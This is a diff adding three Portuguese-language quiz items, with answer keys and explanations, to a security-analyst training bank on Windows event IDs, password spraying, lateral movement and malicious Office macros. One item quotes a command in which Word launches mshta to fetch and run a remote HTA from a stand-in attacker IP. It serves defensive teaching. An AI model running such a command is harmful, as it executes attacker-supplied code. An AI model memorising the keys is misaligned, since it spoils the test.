@@ -1606,5 +1606,41 @@ window.QUIZ_BANK = [
     "correct": 0,
     "explanation": "O evento 4720 significa que foi criada uma conta de utilizador e o 4732 que foi adicionado um membro a um grupo local com segurança ativa, aqui o Administrators. Uma conta nova com nível de administrador criada à noite sem pedido de alteração é uma jogada típica de persistência, por isso encontra o criador nos detalhes do evento, desativa a conta e verifica os logons e as ações dela. O Windows Server Backup não cria contas, o password spraying aparece como logons falhados como o 4625 ou o 4771, e nenhum dos eventos tem a ver com arquivo.",
     "difficulty": "Médio"
+  },
+  {
+    "question": "Em dez minutos um controlador de domínio regista o evento 4771 com código de falha 0x18 para 300 contas diferentes, uma ou duas tentativas cada, todas a partir do IP do mesmo posto. Qual é a atividade mais provável?",
+    "options": [
+      "Um dia normal de mudança de palavra-passe, em que a política do domínio obriga todos a escrever uma nova no próximo login",
+      "Desvio do relógio no posto, que faz o Kerberos recusar todos os tickets até a hora voltar a estar certa com o domínio",
+      "Password spraying por Kerberos: poucas palavras-passe comuns testadas em muitas contas para fugir ao bloqueio",
+      "Uma unidade de rede mapeada avariada no posto, que repete em ciclo a palavra-passe guardada para cada utilizador do PC"
+    ],
+    "correct": 2,
+    "explanation": "O evento 4771 é uma falha de pré-autenticação Kerberos e o código 0x18 indica palavra-passe errada. Muitas contas com só uma ou duas tentativas cada, vindas de uma única origem, é o padrão de password spraying, que fica abaixo do limite de bloqueio. O desvio de relógio aparece como código 0x25, um dia de mudança de palavra-passe não vem de um só IP e uma unidade mapeada presa repete uma conta, não centenas.",
+    "difficulty": "Médio"
+  },
+  {
+    "question": "O EDR mostra o WINWORD.EXE a arrancar 'mshta.exe http://203.0.113.50/inv.hta' no portátil de um utilizador, seguido de um processo PowerShell com um comando codificado. Qual é a melhor leitura e a primeira resposta?",
+    "options": [
+      "O Word está a descarregar uma atualização de modelo pelo mshta, o que é normal; permite e junta o IP à lista branca do proxy",
+      "Uma macro usou o LOLBin mshta para correr um HTA remoto; isola o portátil e bloqueia o IP e esse processo filho do Office",
+      "O utilizador abriu um ficheiro de ajuda no Word e o mshta é o visualizador de ajuda HTML; pede-lhe para fechar o Word e repetir",
+      "O PowerShell depois do mshta é o Windows a verificar a assinatura do ficheiro, por isso espera que o Defender acabe de analisar o HTA"
+    ],
+    "correct": 1,
+    "explanation": "O mshta.exe corre HTML Applications com plenos direitos de script, e um HTA remoto lançado pelo Word seguido de PowerShell codificado é uma cadeia clássica de macro maliciosa. Isola o equipamento, bloqueia o endereço e ativa a regra ASR que impede as apps do Office de criar processos filho. Os modelos do Word não vêm pelo mshta, o visualizador de ajuda é o hh.exe e a verificação de assinaturas não lança PowerShell.",
+    "difficulty": "Difícil"
+  },
+  {
+    "question": "Num servidor de ficheiros, o evento 4648 mostra que o utilizador dos RH 'mrosa' correu um processo com as credenciais explícitas de 'adm-backup', um Domain Admin, e depois ligou-se ao C$ de dez servidores em poucos minutos. O que deve concluir o analista?",
+    "options": [
+      "O evento 4648 aparece em todos os logins normais, por isso um utilizador comum usar um nome de admin é esperado e não exige nada",
+      "O serviço de backup corre de propósito com o utilizador dos RH, porque os backups começam sempre na conta mais usada",
+      "O Windows mudou o utilizador para a conta de admin sozinho depois de um aviso UAC, e essa conta abriu as partilhas por si",
+      "Uma sessão dos RH nunca deve ter credenciais de Domain Admin; trata como possível roubo de credenciais e movimento lateral"
+    ],
+    "correct": 3,
+    "explanation": "O evento 4648 regista um login tentado com credenciais explícitas, como no runas ou no 'net use /user'. Um utilizador dos RH a usar uma conta Domain Admin e a mexer em partilhas administrativas de vários servidores aponta para credenciais roubadas usadas em movimento lateral. Desativa ou repõe a 'adm-backup', delimita os equipamentos onde chegou e verifica o portátil dos RH. O 4648 não é escrito em todos os logins, os serviços de backup não correm em sessões de utilizador e o UAC nunca te troca para outra conta.",
+    "difficulty": "Médio"
   }
 ];
